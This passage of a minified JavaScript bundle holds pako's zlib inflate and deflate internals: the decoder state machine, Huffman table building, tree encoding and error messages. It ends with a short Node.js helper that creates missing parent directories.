t;o--,u+=i[s++]<<l,l+=8}if((65535&u)!=(u>>>16^65535)){t.msg="invalid stored block lengths",r.mode=30;break}if(r.length=65535&u,l=u=0,r.mode=15,6===e)break t;case 15:r.mode=16;case 16:if(c=r.length){if(o<c&&(c=o),h<c&&(c=h),0===c)break t;I.arraySet(n,i,s,c,a),o-=c,s+=c,h-=c,a+=c,r.length-=c;break}r.mode=12;break;case 17:for(;l<14;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(r.nlen=257+(31&u),u>>>=5,l-=5,r.ndist=1+(31&u),u>>>=5,l-=5,r.ncode=4+(15&u),u>>>=4,l-=4,286<r.nlen||30<r.ndist){t.msg="too many length or distance symbols",r.mode=30;break}r.have=0,r.mode=18;case 18:for(;r.have<r.ncode;){for(;l<3;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}r.lens[A[r.have++]]=7&u,u>>>=3,l-=3}for(;r.have<19;)r.lens[A[r.have++]]=0;if(r.lencode=r.lendyn,r.lenbits=7,S={bits:r.lenbits},x=T(0,r.lens,0,19,r.lencode,0,r.work,S),r.lenbits=S.bits,x){t.msg="invalid code lengths set",r.mode=30;break}r.have=0,r.mode=19;case 19:for(;r.have<r.nlen+r.ndist;){for(;g=(C=r.lencode[u&(1<<r.lenbits)-1])>>>16&255,b=65535&C,!((_=C>>>24)<=l);){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(b<16)u>>>=_,l-=_,r.lens[r.have++]=b;else{if(16===b){for(z=_+2;l<z;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(u>>>=_,l-=_,0===r.have){t.msg="invalid bit length repeat",r.mode=30;break}k=r.lens[r.have-1],c=3+(3&u),u>>>=2,l-=2}else if(17===b){for(z=_+3;l<z;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}l-=_,k=0,c=3+(7&(u>>>=_)),u>>>=3,l-=3}else{for(z=_+7;l<z;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}l-=_,k=0,c=11+(127&(u>>>=_)),u>>>=7,l-=7}if(r.have+c>r.nlen+r.ndist){t.msg="invalid bit length repeat",r.mode=30;break}for(;c--;)r.lens[r.have++]=k}}if(30===r.mode)break;if(0===r.lens[256]){t.msg="invalid code -- missing end-of-block",r.mode=30;break}if(r.lenbits=9,S={bits:r.lenbits},x=T(D,r.lens,0,r.nlen,r.lencode,0,r.work,S),r.lenbits=S.bits,x){t.msg="invalid literal/lengths set",r.mode=30;break}if(r.distbits=6,r.distcode=r.distdyn,S={bits:r.distbits},x=T(F,r.lens,r.nlen,r.ndist,r.distcode,0,r.work,S),r.distbits=S.bits,x){t.msg="invalid distances set",r.mode=30;break}if(r.mode=20,6===e)break t;case 20:r.mode=21;case 21:if(6<=o&&258<=h){t.next_out=a,t.avail_out=h,t.next_in=s,t.avail_in=o,r.hold=u,r.bits=l,R(t,d),a=t.next_out,n=t.output,h=t.avail_out,s=t.next_in,i=t.input,o=t.avail_in,u=r.hold,l=r.bits,12===r.mode&&(r.back=-1);break}for(r.back=0;g=(C=r.lencode[u&(1<<r.lenbits)-1])>>>16&255,b=65535&C,!((_=C>>>24)<=l);){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(g&&0==(240&g)){for(v=_,y=g,w=b;g=(C=r.lencode[w+((u&(1<<v+y)-1)>>v)])>>>16&255,b=65535&C,!(v+(_=C>>>24)<=l);){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}u>>>=v,l-=v,r.back+=v}if(u>>>=_,l-=_,r.back+=_,r.length=b,0===g){r.mode=26;break}if(32&g){r.back=-1,r.mode=12;break}if(64&g){t.msg="invalid literal/length code",r.mode=30;break}r.extra=15&g,r.mode=22;case 22:if(r.extra){for(z=r.extra;l<z;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}r.length+=u&(1<<r.extra)-1,u>>>=r.extra,l-=r.extra,r.back+=r.extra}r.was=r.length,r.mode=23;case 23:for(;g=(C=r.distcode[u&(1<<r.distbits)-1])>>>16&255,b=65535&C,!((_=C>>>24)<=l);){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(0==(240&g)){for(v=_,y=g,w=b;g=(C=r.distcode[w+((u&(1<<v+y)-1)>>v)])>>>16&255,b=65535&C,!(v+(_=C>>>24)<=l);){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}u>>>=v,l-=v,r.back+=v}if(u>>>=_,l-=_,r.back+=_,64&g){t.msg="invalid distance code",r.mode=30;break}r.offset=b,r.extra=15&g,r.mode=24;case 24:if(r.extra){for(z=r.extra;l<z;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}r.offset+=u&(1<<r.extra)-1,u>>>=r.extra,l-=r.extra,r.back+=r.extra}if(r.offset>r.dmax){t.msg="invalid distance too far back",r.mode=30;break}r.mode=25;case 25:if(0===h)break t;if(c=d-h,r.offset>c){if((c=r.offset-c)>r.whave&&r.sane){t.msg="invalid distance too far back",r.mode=30;break}p=c>r.wnext?(c-=r.wnext,r.wsize-c):r.wnext-c,c>r.length&&(c=r.length),m=r.window}else m=n,p=a-r.offset,c=r.length;for(h<c&&(c=h),h-=c,r.length-=c;n[a++]=m[p++],--c;);0===r.length&&(r.mode=21);break;case 26:if(0===h)break t;n[a++]=r.length,h--,r.mode=21;break;case 27:if(r.wrap){for(;l<32;){if(0===o)break t;o--,u|=i[s++]<<l,l+=8}if(d-=h,t.total_out+=d,r.total+=d,d&&(t.adler=r.check=r.flags?B(r.check,n,d,a-d):O(r.check,n,d,a-d)),d=h,(r.flags?u:L(u))!==r.check){t.msg="incorrect data check",r.mode=30;break}l=u=0}r.mode=28;case 28:if(r.wrap&&r.flags){for(;l<32;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(u!==(4294967295&r.total)){t.msg="incorrect length check",r.mode=30;break}l=u=0}r.mode=29;case 29:x=1;break t;case 30:x=-3;break t;case 31:return-4;case 32:default:return U}return t.next_out=a,t.avail_out=h,t.next_in=s,t.avail_in=o,r.hold=u,r.bits=l,(r.wsize||d!==t.avail_out&&r.mode<30&&(r.mode<27||4!==e))&&Z(t,t.output,t.next_out,d-t.avail_out)?(r.mode=31,-4):(f-=t.avail_in,d-=t.avail_out,t.total_in+=f,t.total_out+=d,r.total+=d,r.wrap&&d&&(t.adler=r.check=r.flags?B(r.check,n,d,t.next_out-d):O(r.check,n,d,t.next_out-d)),t.data_type=r.bits+(r.last?64:0)+(12===r.mode?128:0)+(20===r.mode||15===r.mode?256:0),(0==f&&0===d||4===e)&&x===N&&(x=-5),x)},r.inflateEnd=function(t){if(!t||!t.state)return U;var e=t.state;return e.window&&(e.window=null),t.state=null,N},r.inflateGetHeader=function(t,e){var r;return t&&t.state?0==(2&(r=t.state).wrap)?U:((r.head=e).done=!1,N):U},r.inflateSetDictionary=function(t,e){var r,i=e.length;return t&&t.state?0!==(r=t.state).wrap&&11!==r.mode?U:11===r.mode&&O(1,e,i,0)!==r.check?-3:Z(t,e,i,i)?(r.mode=31,-4):(r.havedict=1,N):U},r.inflateInfo="pako inflate (from Nodeca project)"},{"../utils/common":41,"./adler32":43,"./crc32":45,"./inffast":48,"./inftrees":50}],50:[function(t,e,r){"use strict";var D=t("../utils/common"),F=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258,0,0],N=[16,16,16,16,16,16,16,16,17,17,17,17,18,18,18,18,19,19,19,19,20,20,20,20,21,21,21,21,16,72,78],U=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577,0,0],P=[16,16,16,16,17,17,18,18,19,19,20,20,21,21,22,22,23,23,24,24,25,25,26,26,27,27,28,28,29,29,64,64];e.exports=function(t,e,r,i,n,s,a,o){var h,u,l,f,d,c,p,m,_,g=o.bits,b=0,v=0,y=0,w=0,k=0,x=0,S=0,z=0,C=0,E=0,A=null,I=0,O=new D.Buf16(16),B=new D.Buf16(16),R=null,T=0;for(b=0;b<=15;b++)O[b]=0;for(v=0;v<i;v++)O[e[r+v]]++;for(k=g,w=15;1<=w&&0===O[w];w--);if(w<k&&(k=w),0===w)return n[s++]=20971520,n[s++]=20971520,o.bits=1,0;for(y=1;y<w&&0===O[y];y++);for(k<y&&(k=y),b=z=1;b<=15;b++)if(z<<=1,(z-=O[b])<0)return-1;if(0<z&&(0===t||1!==w))return-1;for(B[1]=0,b=1;b<15;b++)B[b+1]=B[b]+O[b];for(v=0;v<i;v++)0!==e[r+v]&&(a[B[e[r+v]]++]=v);if(c=0===t?(A=R=a,19):1===t?(A=F,I-=257,R=N,T-=257,256):(A=U,R=P,-1),b=y,d=s,S=v=E=0,l=-1,f=(C=1<<(x=k))-1,1===t&&852<C||2===t&&592<C)return 1;for(;;){for(p=b-S,_=a[v]<c?(m=0,a[v]):a[v]>c?(m=R[T+a[v]],A[I+a[v]]):(m=96,0),h=1<<b-S,y=u=1<<x;n[d+(E>>S)+(u-=h)]=p<<24|m<<16|_|0,0!==u;);for(h=1<<b-1;E&h;)h>>=1;if(0!==h?(E&=h-1,E+=h):E=0,v++,0==--O[b]){if(b===w)break;b=e[r+a[v]]}if(k<b&&(E&f)!==l){for(0===S&&(S=k),d+=y,z=1<<(x=b-S);x+S<w&&!((z-=O[x+S])<=0);)x++,z<<=1;if(C+=1<<x,1===t&&852<C||2===t&&592<C)return 1;n[l=E&f]=k<<24|x<<16|d-s|0}}return 0!==E&&(n[d+E]=b-S<<24|64<<16|0),o.bits=k,0}},{"../utils/common":41}],51:[function(t,e,r){"use strict";e.exports={2:"need dictionary",1:"stream end",0:"","-1":"file error","-2":"stream error","-3":"data error","-4":"insufficient memory","-5":"buffer error","-6":"incompatible version"}},{}],52:[function(t,e,r){"use strict";var n=t("../utils/common"),o=0,h=1;function i(t){for(var e=t.length;0<=--e;)t[e]=0}var s=0,a=29,u=256,l=u+1+a,f=30,d=19,_=2*l+1,g=15,c=16,p=7,m=256,b=16,v=17,y=18,w=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],k=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],x=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7],S=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15],z=new Array(2*(l+2));i(z);var C=new Array(2*f);i(C);var E=new Array(512);i(E);var A=new Array(256);i(A);var I=new Array(a);i(I);var O,B,R,T=new Array(f);function D(t,e,r,i,n){this.static_tree=t,this.extra_bits=e,this.extra_base=r,this.elems=i,this.max_length=n,this.has_stree=t&&t.length}function F(t,e){this.dyn_tree=t,this.max_code=0,this.stat_desc=e}function N(t){return t<256?E[t]:E[256+(t>>>7)]}function U(t,e){t.pending_buf[t.pending++]=255&e,t.pending_buf[t.pending++]=e>>>8&255}function P(t,e,r){t.bi_valid>c-r?(t.bi_buf|=e<<t.bi_valid&65535,U(t,t.bi_buf),t.bi_buf=e>>c-t.bi_valid,t.bi_valid+=r-c):(t.bi_buf|=e<<t.bi_valid&65535,t.bi_valid+=r)}function L(t,e,r){P(t,r[2*e],r[2*e+1])}function j(t,e){for(var r=0;r|=1&t,t>>>=1,r<<=1,0<--e;);return r>>>1}function Z(t,e,r){var i,n,s=new Array(g+1),a=0;for(i=1;i<=g;i++)s[i]=a=a+r[i-1]<<1;for(n=0;n<=e;n++){var o=t[2*n+1];0!==o&&(t[2*n]=j(s[o]++,o))}}function W(t){var e;for(e=0;e<l;e++)t.dyn_ltree[2*e]=0;for(e=0;e<f;e++)t.dyn_dtree[2*e]=0;for(e=0;e<d;e++)t.bl_tree[2*e]=0;t.dyn_ltree[2*m]=1,t.opt_len=t.static_len=0,t.last_lit=t.matches=0}function M(t){8<t.bi_valid?U(t,t.bi_buf):0<t.bi_valid&&(t.pending_buf[t.pending++]=t.bi_buf),t.bi_buf=0,t.bi_valid=0}function H(t,e,r,i){var n=2*e,s=2*r;return t[n]<t[s]||t[n]===t[s]&&i[e]<=i[r]}function G(t,e,r){for(var i=t.heap[r],n=r<<1;n<=t.heap_len&&(n<t.heap_len&&H(e,t.heap[n+1],t.heap[n],t.depth)&&n++,!H(e,i,t.heap[n],t.depth));)t.heap[r]=t.heap[n],r=n,n<<=1;t.heap[r]=i}function K(t,e,r){var i,n,s,a,o=0;if(0!==t.last_lit)for(;i=t.pending_buf[t.d_buf+2*o]<<8|t.pending_buf[t.d_buf+2*o+1],n=t.pending_buf[t.l_buf+o],o++,0===i?L(t,n,e):(L(t,(s=A[n])+u+1,e),0!==(a=w[s])&&P(t,n-=I[s],a),L(t,s=N(--i),r),0!==(a=k[s])&&P(t,i-=T[s],a)),o<t.last_lit;);L(t,m,e)}function Y(t,e){var r,i,n,s=e.dyn_tree,a=e.stat_desc.static_tree,o=e.stat_desc.has_stree,h=e.stat_desc.elems,u=-1;for(t.heap_len=0,t.heap_max=_,r=0;r<h;r++)0!==s[2*r]?(t.heap[++t.heap_len]=u=r,t.depth[r]=0):s[2*r+1]=0;for(;t.heap_len<2;)s[2*(n=t.heap[++t.heap_len]=u<2?++u:0)]=1,t.depth[n]=0,t.opt_len--,o&&(t.static_len-=a[2*n+1]);for(e.max_code=u,r=t.heap_len>>1;1<=r;r--)G(t,s,r);for(n=h;r=t.heap[1],t.heap[1]=t.heap[t.heap_len--],G(t,s,1),i=t.heap[1],t.heap[--t.heap_max]=r,t.heap[--t.heap_max]=i,s[2*n]=s[2*r]+s[2*i],t.depth[n]=(t.depth[r]>=t.depth[i]?t.depth[r]:t.depth[i])+1,s[2*r+1]=s[2*i+1]=n,t.heap[1]=n++,G(t,s,1),2<=t.heap_len;);t.heap[--t.heap_max]=t.heap[1],function(t,e){var r,i,n,s,a,o,h=e.dyn_tree,u=e.max_code,l=e.stat_desc.static_tree,f=e.stat_desc.has_stree,d=e.stat_desc.extra_bits,c=e.stat_desc.extra_base,p=e.stat_desc.max_length,m=0;for(s=0;s<=g;s++)t.bl_count[s]=0;for(h[2*t.heap[t.heap_max]+1]=0,r=t.heap_max+1;r<_;r++)p<(s=h[2*h[2*(i=t.heap[r])+1]+1]+1)&&(s=p,m++),h[2*i+1]=s,u<i||(t.bl_count[s]++,a=0,c<=i&&(a=d[i-c]),o=h[2*i],t.opt_len+=o*(s+a),f&&(t.static_len+=o*(l[2*i+1]+a)));if(0!==m){do{for(s=p-1;0===t.bl_count[s];)s--;t.bl_count[s]--,t.bl_count[s+1]+=2,t.bl_count[p]--,m-=2}while(0<m);for(s=p;0!==s;s--)for(i=t.bl_count[s];0!==i;)u<(n=t.heap[--r])||(h[2*n+1]!==s&&(t.opt_len+=(s-h[2*n+1])*h[2*n],h[2*n+1]=s),i--)}}(t,e),Z(s,u,t.bl_count)}function X(t,e,r){var i,n,s=-1,a=e[1],o=0,h=7,u=4;for(0===a&&(h=138,u=3),e[2*(r+1)+1]=65535,i=0;i<=r;i++)n=a,a=e[2*(i+1)+1],++o<h&&n===a||(o<u?t.bl_tree[2*n]+=o:0!==n?(n!==s&&t.bl_tree[2*n]++,t.bl_tree[2*b]++):o<=10?t.bl_tree[2*v]++:t.bl_tree[2*y]++,s=n,u=(o=0)===a?(h=138,3):n===a?(h=6,3):(h=7,4))}function V(t,e,r){var i,n,s=-1,a=e[1],o=0,h=7,u=4;for(0===a&&(h=138,u=3),i=0;i<=r;i++)if(n=a,a=e[2*(i+1)+1],!(++o<h&&n===a)){if(o<u)for(;L(t,n,t.bl_tree),0!=--o;);else 0!==n?(n!==s&&(L(t,n,t.bl_tree),o--),L(t,b,t.bl_tree),P(t,o-3,2)):o<=10?(L(t,v,t.bl_tree),P(t,o-3,3)):(L(t,y,t.bl_tree),P(t,o-11,7));s=n,u=(o=0)===a?(h=138,3):n===a?(h=6,3):(h=7,4)}}i(T);var q=!1;function J(t,e,r,i){P(t,(s<<1)+(i?1:0),3),function(t,e,r,i){M(t),i&&(U(t,r),U(t,~r)),n.arraySet(t.pending_buf,t.window,e,r,t.pending),t.pending+=r}(t,e,r,!0)}r._tr_init=function(t){q||(function(){var t,e,r,i,n,s=new Array(g+1);for(i=r=0;i<a-1;i++)for(I[i]=r,t=0;t<1<<w[i];t++)A[r++]=i;for(A[r-1]=i,i=n=0;i<16;i++)for(T[i]=n,t=0;t<1<<k[i];t++)E[n++]=i;for(n>>=7;i<f;i++)for(T[i]=n<<7,t=0;t<1<<k[i]-7;t++)E[256+n++]=i;for(e=0;e<=g;e++)s[e]=0;for(t=0;t<=143;)z[2*t+1]=8,t++,s[8]++;for(;t<=255;)z[2*t+1]=9,t++,s[9]++;for(;t<=279;)z[2*t+1]=7,t++,s[7]++;for(;t<=287;)z[2*t+1]=8,t++,s[8]++;for(Z(z,l+1,s),t=0;t<f;t++)C[2*t+1]=5,C[2*t]=j(t,5);O=new D(z,w,u+1,l,g),B=new D(C,k,0,f,g),R=new D(new Array(0),x,0,d,p)}(),q=!0),t.l_desc=new F(t.dyn_ltree,O),t.d_desc=new F(t.dyn_dtree,B),t.bl_desc=new F(t.bl_tree,R),t.bi_buf=0,t.bi_valid=0,W(t)},r._tr_stored_block=J,r._tr_flush_block=function(t,e,r,i){var n,s,a=0;0<t.level?(2===t.strm.data_type&&(t.strm.data_type=function(t){var e,r=4093624447;for(e=0;e<=31;e++,r>>>=1)if(1&r&&0!==t.dyn_ltree[2*e])return o;if(0!==t.dyn_ltree[18]||0!==t.dyn_ltree[20]||0!==t.dyn_ltree[26])return h;for(e=32;e<u;e++)if(0!==t.dyn_ltree[2*e])return h;return o}(t)),Y(t,t.l_desc),Y(t,t.d_desc),a=function(t){var e;for(X(t,t.dyn_ltree,t.l_desc.max_code),X(t,t.dyn_dtree,t.d_desc.max_code),Y(t,t.bl_desc),e=d-1;3<=e&&0===t.bl_tree[2*S[e]+1];e--);return t.opt_len+=3*(e+1)+5+5+4,e}(t),n=t.opt_len+3+7>>>3,(s=t.static_len+3+7>>>3)<=n&&(n=s)):n=s=r+5,r+4<=n&&-1!==e?J(t,e,r,i):4===t.strategy||s===n?(P(t,2+(i?1:0),3),K(t,z,C)):(P(t,4+(i?1:0),3),function(t,e,r,i){var n;for(P(t,e-257,5),P(t,r-1,5),P(t,i-4,4),n=0;n<i;n++)P(t,t.bl_tree[2*S[n]+1],3);V(t,t.dyn_ltree,e-1),V(t,t.dyn_dtree,r-1)}(t,t.l_desc.max_code+1,t.d_desc.max_code+1,a+1),K(t,t.dyn_ltree,t.dyn_dtree)),W(t),i&&M(t)},r._tr_tally=function(t,e,r){return t.pending_buf[t.d_buf+2*t.last_lit]=e>>>8&255,t.pending_buf[t.d_buf+2*t.last_lit+1]=255&e,t.pending_buf[t.l_buf+t.last_lit]=255&r,t.last_lit++,0===e?t.dyn_ltree[2*r]++:(t.matches++,e--,t.dyn_ltree[2*(A[r]+u+1)]++,t.dyn_dtree[2*N(e)]++),t.last_lit===t.lit_bufsize-1},r._tr_align=function(t){P(t,2,3),L(t,m,z),function(t){16===t.bi_valid?(U(t,t.bi_buf),t.bi_buf=0,t.bi_valid=0):8<=t.bi_valid&&(t.pending_buf[t.pending++]=255&t.bi_buf,t.bi_buf>>=8,t.bi_valid-=8)}(t)}},{"../utils/common":41}],53:[function(t,e,r){"use strict";e.exports=function(){this.input=null,this.next_in=0,this.avail_in=0,this.total_in=0,this.output=null,this.next_out=0,this.avail_out=0,this.total_out=0,this.msg="",this.state=null,this.data_type=2,this.adler=0}},{}],54:[function(t,e,r){"use strict";e.exports="function"==typeof setImmediate?setImmediate:function(){var t=[].slice.apply(arguments);t.splice(1,0,0),setTimeout.apply(null,t)}},{}]},{},[10])(10)});



function ensureDirectoryExistence(filePath) {
  var dirname = path.dirname(filePath);
  if (fs.existsSync(dirname)) {
    return true;
  }
  ensureDirectoryExistence(dirname);
  fs.mkdir(dirname, function () {

  });
}
